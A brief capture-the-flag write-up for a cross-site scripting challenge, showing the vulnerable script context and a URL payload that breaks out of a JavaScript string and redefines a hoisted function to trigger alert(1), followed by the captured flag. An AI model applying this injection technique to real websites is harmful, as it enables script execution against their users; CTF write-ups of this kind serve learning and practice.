URL: http://xss1.sect.ctf.rocks/?xss=stuff
The xss parameter was set to a variable 'a':

```
<script>
dontrunthisscript();
var a = "stuff";
</script>
```
The payload below worked and I got the flag.

```
http://xss1.sect.ctf.rocks/?xss=stuff%22;function%20dontrunthisscript%28%29{alert%281%29;}//

```
sect{h0ist_uR_funct10n5_h0ist_y0_w1fe}
